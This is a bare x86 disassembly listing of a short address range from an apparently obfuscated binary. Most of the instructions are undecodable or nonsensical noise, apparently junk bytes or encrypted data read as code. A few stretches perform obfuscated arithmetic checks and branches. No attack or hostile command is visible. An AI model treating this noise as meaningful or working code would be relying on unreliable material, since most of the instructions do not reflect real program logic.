  4018ea:	fs sbb al,0xfc
  4018ed:	shl    DWORD PTR [ecx-0x13],0x91
  4018f1:	adc    BYTE PTR [edx+0x1d16b5cb],0x41
  4018f8:	mov    dl,0x7e
  4018fa:	jns    0x40195d
  4018fc:	xor    DWORD PTR [eax-0x3e9bb4d4],0xa
  401903:	loope  0x4018bc
  401905:	lahf   
  401906:	(bad)  
  401907:	pop    edx
  401908:	or     eax,0x41d60d7d
  40190d:	and    DWORD PTR [ecx-0x26a46684],ecx
  401913:	or     DWORD PTR [edi+0x7937e41b],edx
  401919:	sub    ecx,DWORD PTR [esp+ebp*4+0x7c52088f]
  401920:	fisub  DWORD PTR [ecx]
  401922:	inc    esp
  401923:	mov    al,0xe5
  401925:	cmp    edx,DWORD PTR [ecx+ebp*4-0x6]
  401929:	xlat   BYTE PTR ds:[ebx]
  40192a:	sti    
  40192b:	loop   0x401924
  40192d:	jae    0x4018cf
  40192f:	dec    edx
  401930:	jb     0x40192b
  401932:	repz or al,0xf9
  401935:	pand   mm3,mm5
  401938:	fisub  WORD PTR [ebx+0x0]
  40193b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40193c:	cli    
  40193d:	xchg   esi,eax
  40193e:	aaa    
  40193f:	in     al,dx
  401940:	sbb    al,0xd2
  401942:	jecxz  0x401955
  401944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401945:	mov    dh,0x8c
  401947:	push   cs
  401948:	mov    esi,0x89f5af8b
  40194d:	inc    ebp
  40194e:	in     al,0x8b
  401950:	inc    ebp
  401951:	in     al,0xc7
  401953:	add    BYTE PTR [ecx-0x740760d3],ch
  401959:	inc    ebp
  40195a:	in     al,dx
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x3b7bf628
  401994:	das    
  401995:	(bad)  
  401996:	jecxz  0x401a08
  401998:	jp     0x401a0a
  40199a:	jo     0x401a0c
  40199c:	jle    0x401a0e
  40199e:	jo     0x4019b7
  4019a0:	xor    eax,0x57b367d7
  4019a5:	mov    ecx,0x7f24b4d2
  4019aa:	outs   dx,BYTE PTR ds:[esi]
  4019ab:	(bad)  
  4019ac:	dec    ebp
  4019ad:	dec    edx
  4019ae:	cwde   
  4019af:	dec    ebx
  4019b0:	fst    st(1)
  4019b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019b3:	ret    
  4019b4:	fcmovb st,st(7)
  4019b6:	inc    esp
  4019b7:	sbb    esi,DWORD PTR [ecx-0x455312e9]
  4019bd:	out    dx,eax
  4019be:	shr    BYTE PTR [edx+0x326ed64c],1
  4019c4:	dec    edi
  4019c5:	mov    ebx,0xa57568ce
  4019ca:	mov    edi,0x9de8b238
  4019cf:	sub    BYTE PTR [ebx],al
  4019d1:	push   eax
  4019d2:	cmp    eax,0xb37ea9eb
  4019d7:	(bad)  
  4019d8:	and    BYTE PTR [ebx+0x7e0fbd8a],dl
  4019de:	iret   
  4019df:	fwait
  4019e0:	stc    
  4019e1:	bound  esi,QWORD PTR [ebp-0x52]
  4019e4:	add    edi,DWORD PTR [edi+ecx*2+0x54]
  4019e8:	lods   al,BYTE PTR ds:[esi]
  4019e9:	mov    esi,0x958ff73d
  4019ee:	arpl   di,cx
  4019f0:	jg     0x401a24
  4019f2:	mov    dx,0x1b5f
  4019f6:	dec    esp
  4019f7:	adc    BYTE PTR [ebp+0x47c667be],bh
  4019fd:	call   0xd5ff574a
  401a02:	mov    dl,0xac
  401a04:	and    bh,BYTE PTR [edi-0x25]
  401a07:	jnp    0x401a56
  401a09:	and    DWORD PTR [edi+eax*2],ebx
  401a0c:	sbb    BYTE PTR [ebx],bl
  401a0e:	adc    BYTE PTR [esi-0x1e5db633],dh
  401a14:	test   DWORD PTR ds:0x891f9bc,ebp
  401a1a:	pop    edi
  401a1b:	ficomp DWORD PTR [ebx-0xb]
  401a1e:	je     0x401a14
  401a20:	and    al,0x34
  401a22:	push   esp
  401a23:	jne    0x401a10
  401a25:	adc    BYTE PTR [edx+eiz*4+0x40ad29ae],al
  401a2c:	lock outs dx,DWORD PTR ds:[esi]
  401a2e:	sub    al,0x95
  401a30:	sub    cl,BYTE PTR [eax]
  401a32:	pop    edi
  401a33:	lahf   
  401a34:	xor    al,0x26
  401a36:	xchg   DWORD PTR [edi-0x47bb05a5],ecx
  401a3c:	adc    al,BYTE PTR [ecx]
  401a3e:	fiadd  WORD PTR [ecx]
  401a40:	cmp    BYTE PTR [edx+0x4e75b9ec],bl
  401a46:	cmp    al,0x3b
  401a48:	lea    esp,[esp+ebx*1-0x19]
  401a4c:	and    esi,DWORD PTR [edi]
  401a4e:	loopne 0x401a7d
  401a50:	lods   al,BYTE PTR ds:[esi]
  401a51:	mov    ebx,0xcfd37463
  401a56:	(bad)  
  401a57:	jmp    0x401ac4
  401a59:	add    ecx,ebx
  401a5b:	mov    ds,WORD PTR [eax]
  401a5d:	inc    edi
  401a5e:	ss pop ebx
  401a60:	cmp    al,0x3b
  401a62:	dec    esp
  401a63:	scas   al,BYTE PTR es:[edi]
  401a64:	sbb    eax,0xb87fc6ab
  401a69:	xlat   BYTE PTR ds:[ebx]
  401a6a:	mov    eax,0x3961ece8
  401a6f:	pop    esi
  401a70:	xor    eax,0xb2bf1baf
  401a75:	int3   
  401a76:	retf   
  401a77:	nop
  401a78:	mov    edi,0x962406fe
  401a7d:	pop    esi
  401a7e:	(bad)  
  401a7f:	mov    eax,ds:0x3080e17e
  401a84:	ja     0x401aa5
  401a86:	add    eax,0x9319e674
  401a8b:	jnp    0x401a9a
  401a8d:	shr    edx,0xcb
  401a90:	push   es
  401a91:	ret    0xec4f
  401a94:	popf   
  401a95:	sub    BYTE PTR [ecx+0x32802675],ch
  401a9b:	test   DWORD PTR [esi+0x5c6fff62],ecx
  401aa1:	push   edx
  401aa2:	jno    0x401a5e
  401aa4:	xor    BYTE PTR ds:[esi+0x22],al
  401aa8:	lahf   
  401aa9:	call   0xfb69:0xb6873b2e
  401ab0:	jne    0x401ac6
  401ab2:	pop    ds
  401ab3:	xor    ecx,DWORD PTR [ebx]
  401ab5:	in     eax,dx
  401ab6:	aad    0x60
  401ab8:	frstor [ebx]
  401aba:	inc    ebx
  401abb:	mov    edi,0xed5a04f2
  401ac0:	and    eax,0xfd8fe337
  401ac5:	in     eax,dx
  401ac6:	je     0x401aa5
  401ac8:	sbb    dh,ah
  401aca:	test   eax,0x2a78edc4
  401acf:	xlat   BYTE PTR ds:[ebx]
  401ad0:	sbb    ebx,ebx
  401ad2:	mov    eax,ds:0x4a977ea7
  401ad7:	out    0xa,eax
  401ad9:	and    esi,ecx
  401adb:	fsub   DWORD PTR [esp+ebx*1-0x2fbb3804]
  401ae2:	loop   0x401b5d
  401ae4:	push   cs
  401ae5:	or     bh,bh
  401ae7:	sbb    BYTE PTR [ebp+0x14],cl
  401aea:	push   esp
  401aeb:	cmp    BYTE PTR [eax-0x49],0xb7
  401aef:	inc    edx
  401af0:	bound  esi,QWORD PTR [eax]
  401af2:	stos   BYTE PTR es:[edi],al
  401af3:	pop    edi
  401af4:	mov    BYTE PTR [ecx],ah
  401af6:	stc    
  401af7:	jmp    0xe20a:0x284f390b
  401afe:	or     al,0xf3
  401b00:	call   0x711c:0x6c8b0398
  401b07:	jge    0x401aeb
  401b09:	je     0x401b13
  401b0b:	test   DWORD PTR [ebx+0x28],eax
  401b0e:	ret    0x86a5
  401b11:	xor    ch,0x43
  401b14:	mov    bl,bl
  401b16:	adc    DWORD PTR [ebp+0x1c],edx
  401b19:	mov    eax,ds:0x443a1d66
  401b1e:	mov    al,ds:0x7a7bfa5f
  401b23:	outs   dx,BYTE PTR ds:[esi]
  401b24:	pop    edi
  401b25:	out    0x70,al
  401b27:	jmp    0x401b82
  401b29:	(bad)  
  401b2a:	shr    ah,1
  401b2c:	push   ebx
  401b2d:	jae    0x401ba0
  401b2f:	fst    QWORD PTR [eax-0x47]
  401b32:	dec    esp
  401b33:	test   BYTE PTR [ebx+0x8],0x82
  401b37:	jae    0x401b81
  401b39:	(bad)  
  401b3a:	rol    BYTE PTR [esi-0x50],1
  401b3d:	xchg   ch,ah
  401b3f:	(bad)  
  401b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b43:	inc    edx
  401b44:	test   DWORD PTR [edi+0x105f88f0],esp
  401b4a:	daa    
  401b4b:	sbb    al,0xbb
  401b4d:	mov    al,0xcb
  401b4f:	adc    ebp,DWORD PTR [edx]
  401b51:	es in  eax,0xed
  401b54:	(bad)  
  401b55:	jo     0x401b57
  401b57:	jb     0x401b80
  401b59:	neg    BYTE PTR [ecx-0x38]
  401b5c:	scas   eax,DWORD PTR es:[edi]
  401b5d:	push   esi
  401b5e:	fisub  WORD PTR ds:0x846be023
  401b64:	cmp    cl,dl
  401b66:	pop    ebx
  401b67:	loope  0x401b02
  401b69:	xor    edx,eax
  401b6b:	outs   dx,BYTE PTR ds:[esi]
  401b6c:	push   edi
  401b6d:	aas    
  401b6e:	push   0x59bfa8f9
  401b73:	out    0x80,al
  401b75:	mov    ecx,ebx
  401b77:	jb     0x401bc6
  401b79:	stos   DWORD PTR es:[edi],eax
  401b7a:	cmp    edi,DWORD PTR [edi-0x795b5dc5]
  401b80:	lahf   
  401b81:	test   al,0x87
  401b83:	dec    esp
  401b84:	sbb    eax,0x2364165c
  401b89:	test   eax,0x325976cb
  401b8e:	(bad)  
  401b8f:	push   0x9
  401b91:	rcr    DWORD PTR [ecx],cl
  401b93:	cwd    
  401b95:	pop    esp
  401b96:	push   0xffffffb1
  401b98:	std    
  401b99:	aam    0x7e
  401b9b:	sub    al,0xdf
  401b9d:	and    DWORD PTR [edi],edi
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    ch,al
  401bdd:	dec    eax
  401bde:	mov    edi,0x70787083
  401be3:	jo     0x401c55
  401be5:	jle    0x401c57
  401be7:	jo     0x401c62
  401be9:	adc    BYTE PTR [ecx+0x69456a88],0x62
  401bf0:	jo     0x401c23
  401bf2:	fnstenv [esi+0x491e2642]
  401bf8:	dec    ecx
  401bf9:	ja     0x401bff
  401bfb:	sar    BYTE PTR [ebp+0x65aab075],1
  401c01:	arpl   sp,di
  401c03:	imul   ebp,DWORD PTR [edi+0x49],0xfffffff5
  401c07:	xor    DWORD PTR [ecx+0x4],ebp
  401c0a:	dec    esp
  401c0c:	inc    edx
  401c0d:	in     eax,dx
  401c0e:	inc    ecx
  401c0f:	and    al,0x38
  401c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c12:	repz clc 
  401c14:	adc    BYTE PTR [ecx+0x24],cl
  401c17:	aas    
  401c18:	push   esi
  401c19:	dec    esp
  401c1a:	in     al,0x21
  401c1c:	arpl   bp,bp
  401c1e:	pusha  
  401c1f:	out    0xcd,al
  401c21:	push   ebp
  401c22:	pop    ebp
  401c23:	retf   0xcee0
  401c26:	mov    DWORD PTR [ecx],eax
  401c28:	cwde   
  401c29:	int    0xc8
  401c2b:	dec    ecx
  401c2c:	sbb    eax,DWORD PTR ds:0x47a7b4f9
  401c32:	inc    edi
  401c33:	push   esp
  401c34:	and    edi,DWORD PTR [ebp+0x6c]
  401c37:	lahf   
  401c38:	add    DWORD PTR [ecx-0x4c],edi
  401c3b:	hlt    
  401c3c:	or     ebx,edi
  401c3e:	out    0x45,eax
  401c40:	nop
  401c41:	and    dh,bh
  401c43:	and    dl,BYTE PTR [eax+edx*2]
  401c46:	cmp    al,0x44
  401c48:	xor    DWORD PTR [eax+esi*4+0x7ffdd0b],0xffffff9e
  401c50:	cmp    dl,ah
  401c52:	pop    ebx
  401c53:	dec    ebx
  401c55:	and    dh,BYTE PTR [ebp+0x2e]
  401c58:	fisttp WORD PTR [ebp-0x6c7388b2]
  401c5e:	pop    ebx
  401c5f:	ja     0x401bfb
  401c61:	inc    esp
  401c62:	les    esp,FWORD PTR [edi]
  401c64:	lahf   
  401c65:	std    
  401c66:	jbe    0x401cbc
  401c68:	push   ebx
  401c69:	xor    edi,DWORD PTR [esi]
  401c6b:	mov    dl,BYTE PTR [ecx+ebx*4]
  401c6e:	jg     0x401bf2
  401c70:	rcl    BYTE PTR [eax],0xda
  401c73:	imul   edi,DWORD PTR [edx+edi*4],0x7edf7847
  401c7a:	aaa    
  401c7b:	push   esi
  401c7c:	pusha  
  401c7d:	sub    ah,BYTE PTR [ecx]
  401c7f:	or     eax,ecx
  401c81:	mov    eax,ds:0x63d2424b
  401c86:	lods   al,BYTE PTR ds:[esi]
  401c87:	xor    DWORD PTR [eax],edx
  401c89:	push   esi
  401c8a:	jb     0x401c5f
  401c8c:	pop    ss
  401c8d:	stos   DWORD PTR es:[edi],eax
  401c8e:	pop    ebx
  401c8f:	mov    ecx,0x77a1f3f3
  401c94:	fld    QWORD PTR [ebp+0x128a2020]
  401c9a:	lods   eax,DWORD PTR ds:[esi]
  401c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c9c:	sub    bl,BYTE PTR [eax+0xc7d2e44]
  401ca2:	enter  0x640f,0xcf
  401ca6:	dec    esi
  401ca7:	pop    ecx
  401ca8:	pop    edx
  401ca9:	jb     0x401c34
  401cab:	mov    eax,ds:0x9b7dee9a
  401cb0:	hlt    
  401cb1:	fbstp  TBYTE PTR [ebx-0x5dcc41b]
  401cb7:	js     0x401c82
  401cb9:	dec    eax
  401cba:	fs mov ecx,ebp
  401cbd:	sub    edi,DWORD PTR [edx]
  401cbf:	stos   BYTE PTR es:[edi],al
  401cc0:	mov    edi,0x298034cc
  401cc5:	js     0x401cb3
  401cc7:	push   ebp
  401cc8:	imul   esi,DWORD PTR [esi-0x1f2a6974],0x15
  401ccf:	jno    0x401c54
  401cd1:	mov    ebx,0x46cda2bb
  401cd6:	in     al,dx
  401cd7:	and    ecx,0xe4108b64
  401cdd:	addr16 inc esi
  401cdf:	jno    0x401d52
  401ce1:	add    BYTE PTR [edi-0x605b441c],dl
  401ce7:	adc    BYTE PTR [eax],0xe8
  401cea:	adc    ecx,ecx
  401cec:	and    eax,0xf712c7a1
  401cf1:	pop    edi
  401cf2:	stos   DWORD PTR es:[edi],eax
  401cf3:	mov    ch,0xe
  401cf5:	pushf  
  401cf6:	pop    ebp
  401cf7:	pusha  
  401cf8:	iret   
  401cf9:	jp     0x401d05
  401cfb:	cmp    eax,0x83fdd664
  401d00:	mov    BYTE PTR [esi],bl
  401d02:	and    DWORD PTR ds:0x54a92232,edi
  401d08:	cmp    eax,0x14320071
  401d0d:	push   ds
  401d0e:	nop
  401d0f:	and    al,BYTE PTR [esi-0x7244257e]
  401d15:	adc    cl,BYTE PTR [ecx-0x73b14d4e]
  401d1b:	sar    ah,0xdf
  401d1e:	add    eax,0xa045ae3f
  401d23:	xlat   BYTE PTR ds:[ebx]
  401d24:	sbb    al,dl
  401d26:	cmp    BYTE PTR [edx+0x63f386df],ah
  401d2c:	hlt    
  401d2d:	in     eax,dx
  401d2e:	xchg   ch,bl
  401d30:	pop    ss
  401d31:	jp     0x401cbc
  401d33:	repz mov esi,0x82e6edb6
  401d39:	not    BYTE PTR [esi]
  401d3b:	lds    edx,FWORD PTR [ebp+0xa7b2fd4]
  401d41:	ins    DWORD PTR es:[edi],dx
  401d42:	cs pop ebx
  401d44:	rol    DWORD PTR [ecx-0x2ba17075],0xe3
  401d4b:	pmullw mm3,QWORD PTR [ecx]
  401d4e:	stos   BYTE PTR es:[edi],al
  401d4f:	fdiv   QWORD PTR [esi]
  401d51:	mov    bl,0xd0
  401d53:	or     BYTE PTR [edi-0x64906467],dh
  401d59:	and    al,0x23
  401d5b:	js     0x401d50
  401d5d:	scas   eax,DWORD PTR es:[edi]
  401d5e:	test   edi,edi
  401d60:	scas   eax,DWORD PTR es:[edi]
  401d61:	inc    esi
  401d62:	loop   0x401de1
  401d64:	push   esi
  401d65:	adc    BYTE PTR [esi+0x13],cl
  401d68:	shl    DWORD PTR [ecx],1
  401d6a:	push   ebp
  401d6b:	mov    dl,BYTE PTR gs:[eax+edx*1-0x2350e353]
  401d73:	xchg   ebp,eax
  401d74:	stc    
  401d75:	add    al,BYTE PTR [ebp+edx*8-0x6ba22f0a]
  401d7c:	xor    dh,cl
  401d7e:	inc    edx
  401d7f:	loope  0x401d11
  401d81:	test   BYTE PTR [edx+eax*8],0xdc
  401d85:	xchg   DWORD PTR [ebx+0x7a],ebp
  401d88:	test   BYTE PTR ss:[ecx],dh
  401d8b:	push   eax
  401d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d8d:	mov    dh,0x5d
  401d8f:	(bad)  
  401d90:	jmp    0x3239:0x77aaa0e4
  401d97:	ret    0x8687
  401d9a:	and    BYTE PTR [edx],0x9b
  401d9d:	dec    ecx
  401d9e:	shr    esi,0xf
  401da1:	cmp    DWORD PTR [esi],esp
  401da3:	push   edx
  401da4:	mov    ?,WORD PTR ds:0xbdb8dea4
  401daa:	sbb    BYTE PTR [ecx],dl
  401dac:	dec    esp
  401dad:	(bad)  
  401dae:	das    
  401daf:	popf   
  401db0:	pusha  
  401db1:	repnz inc esp
  401db3:	in     al,0xc
  401db5:	arpl   WORD PTR [ebp-0x2b],di
  401db8:	cmp    BYTE PTR [esi+0x57],bh
  401dbb:	call   0xd472:0x5c9ced2d
  401dc2:	adc    DWORD PTR [edx+0xd],0x4e2ec365
  401dc9:	ds xchg ecx,eax
  401dcb:	cwde   
  401dcc:	add    BYTE PTR [ebx],ch
  401dce:	mov    esi,DWORD PTR [edx]
  401dd0:	xor    edx,DWORD PTR [esi]
  401dd2:	jo     0x401e41
  401dd4:	fisubr DWORD PTR [eax+0x4a83dfc3]
  401dda:	repz xor ebx,DWORD PTR [esi]
  401ddd:	push   edx
  401dde:	jecxz  0x401da8
  401de0:	or     bl,BYTE PTR [edx+0x1a]
  401de3:	adc    edx,DWORD PTR [eax-0x11]
  401de6:	push   0x29
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [esp+eax*1-0x30],dl
  401e44:	repz shl DWORD PTR [eax+0x6],1
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	ror    DWORD PTR [eax],0xfb
  401e51:	mov    al,0x89
  401e53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e54:	int3   
  401e55:	outs   dx,DWORD PTR ds:[esi]
  401e56:	jg     0x401ec2
  401e58:	or     BYTE PTR [esi+0x6d],cl
  401e5b:	call   0x8d94545a
  401e60:	pushf  
  401e61:	sbb    eax,0x798baf68
  401e66:	cmp    DWORD PTR [esi],edx
  401e68:	iret   
  401e69:	push   ebp
  401e6a:	cwde   
  401e6b:	jge    0x401e1b
  401e6d:	rol    BYTE PTR [eax+ebp*1],1
  401e70:	cdq    
  401e71:	dec    edi
  401e72:	aas    
  401e73:	shl    DWORD PTR [edx],0xf0
  401e76:	div    DWORD PTR [esi]
  401e78:	out    0xd0,al
  401e7a:	mov    al,ds:0x962559bd
  401e7f:	sti    
  401e80:	in     al,0xd6
  401e82:	js     0x401e84
  401e84:	inc    eax
  401e85:	js     0x401e3a
  401e87:	hlt    
  401e88:	add    dh,BYTE PTR [ebp+0x64b23b51]
  401e8e:	mov    cs,WORD PTR [esi]
  401e90:	cwde   
  401e91:	mov    al,gs:0x343e87cb
  401e97:	jp     0x401e95
  401e99:	push   eax
  401e9a:	sub    al,0xc5
  401e9c:	xchg   DWORD PTR [ecx+0x1b],ecx
  401e9f:	add    eax,0xa9b206c8
  401ea4:	into   
  401ea5:	call   DWORD PTR [ebp-0x23]
  401ea8:	cmp    al,BYTE PTR [eax-0x6864cbde]
  401eae:	pop    edx
  401eaf:	lods   al,BYTE PTR ds:[esi]
  401eb0:	mov    cl,0x17
  401eb2:	dec    esi
  401eb3:	data16 jno 0x401e71
  401eb6:	sub    dh,BYTE PTR [esi]
  401eb8:	cmp    BYTE PTR [edx-0x7c980af],al
  401ebe:	pop    esi
  401ebf:	fucomp st(0)
  401ec1:	push   ebp
  401ec2:	pop    edx
  401ec3:	test   eax,eax
  401ec5:	les    edi,FWORD PTR [edx]
  401ec7:	pop    ebx
  401ec8:	jo     0x401f37
  401eca:	mov    ds:0x790a9456,eax
  401ecf:	cdq    
  401ed0:	sbb    eax,0x275ee1a3
  401ed5:	xchg   ecx,eax
  401ed6:	mov    edi,0x22b0a81f
  401edb:	cmp    DWORD PTR [ebx-0x26962772],esi
  401ee1:	lahf   
  401ee2:	sbb    BYTE PTR [ecx+0x35],bl
  401ee5:	mov    ch,0xb5
  401ee7:	loope  0x401f54
  401ee9:	push   esi
  401eea:	fimul  WORD PTR [esi]
  401eec:	and    eax,ecx
  401eee:	test   BYTE PTR [esi+0x7b4135d4],0x47
  401ef5:	out    dx,eax
  401ef6:	call   0x23ab:0x12b150a2
  401efd:	push   es
  401efe:	mov    al,ds:0xcec7440
  401f03:	ret    0xcb7c
  401f06:	pop    esp
  401f07:	mov    ebp,0x393c83b3
  401f0c:	test   BYTE PTR [ebx-0x70],0x5
  401f10:	dec    ebx
  401f11:	mov    WORD PTR [esi+0x61],es
  401f14:	pcmpgtw mm4,QWORD PTR [ecx+esi*1]
  401f18:	gs mov esi,0x5c6c8ebe
  401f1e:	pop    ecx
  401f1f:	xor    DWORD PTR [ecx+0x68457319],eax
  401f25:	adc    al,0xb8
  401f27:	dec    ebp
  401f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f29:	(bad)  
  401f2a:	cmp    DWORD PTR [ebp-0xb32ca13],eax
  401f30:	(bad)  
  401f31:	add    BYTE PTR [ecx-0x46],0x29
  401f35:	jecxz  0x401ec6
  401f37:	jecxz  0x401f7e
  401f39:	sbb    ah,BYTE PTR [edi]
  401f3b:	loop   0x401ebf
  401f3d:	add    eax,0xa08e434e
  401f42:	out    0xf,eax
  401f44:	mov    es,WORD PTR [ecx]
  401f46:	mov    ebx,0xb5c04826
  401f4b:	inc    esi
  401f4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f4d:	fisttp DWORD PTR [ebp-0x6c]
  401f50:	(bad)  
  401f51:	dec    edi
  401f52:	lahf   
  401f53:	ret    0xaa92
  401f56:	fidiv  WORD PTR [edx-0x7aa6f77]
  401f5c:	mov    dh,0xb4
  401f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f5f:	in     eax,dx
  401f60:	lahf   
  401f61:	(bad)  
  401f62:	scas   eax,DWORD PTR es:[edi]
  401f63:	arpl   WORD PTR [ebx],ax
  401f65:	out    0x85,eax
  401f67:	inc    eax
  401f68:	(bad)  
  401f69:	std    
  401f6a:	mov    dh,0x4d
  401f6c:	cmp    eax,DWORD PTR [edi+0x58]
  401f6f:	scas   eax,DWORD PTR es:[edi]
  401f70:	in     al,0xa9
  401f72:	pusha  
  401f73:	sub    DWORD PTR [edx-0x71a782fa],0x44
  401f7a:	ins    DWORD PTR es:[edi],dx
  401f7b:	xchg   ebp,eax
  401f7c:	nop
  401f7d:	or     DWORD PTR [edi+0x78c0a7e1],ecx
  401f83:	retf   
  401f84:	pop    ebx
  401f85:	mov    ds:0x5c373679,eax
  401f8a:	test   al,0xd8
  401f8c:	add    bl,BYTE PTR ds:0x78c99b34
  401f92:	mov    al,0xbb
  401f94:	sub    ah,BYTE PTR [ebp+ecx*8+0x195e0993]
  401f9b:	sbb    ah,BYTE PTR [ecx-0x80]
  401f9e:	fisttp DWORD PTR [esi-0x6d]
  401fa1:	jmp    0x8f468b6e
  401fa6:	scas   eax,DWORD PTR es:[edi]
  401fa7:	(bad)
  401faa:	lods   al,BYTE PTR ds:[esi]
  401fab:	mov    dh,0xa
  401fad:	sbb    DWORD PTR [edi-0xebc21a8],edx
  401fb3:	test   al,0x71
  401fb5:	add    dh,BYTE PTR [eax]
  401fb7:	test   al,0x9c
  401fb9:	out    0xda,eax
  401fbb:	mov    cs,ecx
  401fbd:	fist   WORD PTR es:[edi-0x2e43c5e2]
  401fc4:	xchg   edi,eax
  401fc5:	jns    0x402030
  401fc7:	sbb    bl,BYTE PTR [ebp+0x1c]
  401fca:	hlt    
  401fcb:	stos   DWORD PTR es:[edi],eax
  401fcc:	cmp    al,0x95
  401fce:	push   esp
  401fcf:	mov    cl,0x5b
  401fd1:	add    esi,ecx
  401fd3:	(bad)  
  401fd4:	dec    ebp
  401fd5:	mov    ah,0xdf
  401fd7:	daa    
  401fd8:	ret    0xb23
  401fdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fdc:	(bad)  
  401fdd:	popa   
  401fde:	or     edx,edi
  401fe0:	mov    bh,BYTE PTR [edx+ecx*8+0x9]
  401fe4:	loope  0x401fb8
  401fe6:	jmp    0x401ff0
  401fe8:	cmp    DWORD PTR [edi-0x5f],0xffffffb2
  401fec:	pop    ecx
  401fed:	ins    BYTE PTR es:[edi],dx
  401fee:	sahf   
  401fef:	and    edi,DWORD PTR es:[edi]
  401ff2:	or     eax,0xe8f0a014
  401ff7:	in     al,dx
  401ff8:	test   cl,ah
  401ffa:	sub    DWORD PTR [esi+0x1a],ebp
  401ffd:	adc    al,BYTE PTR [edx+0x6f]
  402000:	cs je  0x40204d
  402003:	inc    esi
  402004:	lds    edx,FWORD PTR ds:0x3ebf114b
  40200a:	push   ebx
  40200b:	arpl   WORD PTR [edx+0x2bf3dbfc],dx
  402011:	daa    
  402012:	push   esi
  402013:	adc    al,0xfb
  402015:	push   es
  402016:	push   ebp
  402017:	adc    al,0xff
  402019:	fdivp  st(3),st
  40201b:	add    eax,0x90e372fc
  402020:	jp     0x402018
  402022:	and    al,0x4
  402024:	and    cl,BYTE PTR [ebx]
  402026:	ins    BYTE PTR es:[edi],dx
  402027:	test   DWORD PTR [ebx+edi*1-0x5f66eb5a],ebx
  40202e:	inc    edi
  40202f:	mov    eax,ds:0x37dbae26
  402034:	mov    bh,0x80
  402036:	lea    edi,ds:0x4df4319b
  40203c:	fmul   DWORD PTR [edi]
  40203e:	jno    0x40205a
  402040:	les    ecx,FWORD PTR [ebp+0x5e]
  402043:	fcomi  st,st(0)
  402045:	enter  0x6b2a,0x39
  402049:	scas   al,BYTE PTR es:[edi]
  40204a:	popa   
  40204b:	and    edx,DWORD PTR [edx]
  40204d:	inc    edx
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	sbb    bh,0xb3
  40206c:	div    BYTE PTR ss:[eax+0x4]
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	pop    ecx
  402077:	js     0x4020c2
  402079:	cmp    al,0x72
  40207b:	ror    ch,1
  40207d:	jno    0x402079
  40207f:	loop   0x40209c
  402081:	and    BYTE PTR [edi+0x5],al
  402084:	fistp  DWORD PTR [esi-0x35]
  402087:	mov    eax,ds:0xc179ecf6
  40208c:	add    eax,ebp
  40208e:	inc    eax
  40208f:	std    
  402090:	mov    al,ds:0x31ccda2b
  402095:	mov    esp,0xe05b2575
  40209a:	std    
  40209b:	call   0x75a7:0xff7bb2e5
  4020a2:	and    ch,BYTE PTR [esi-0x2d]
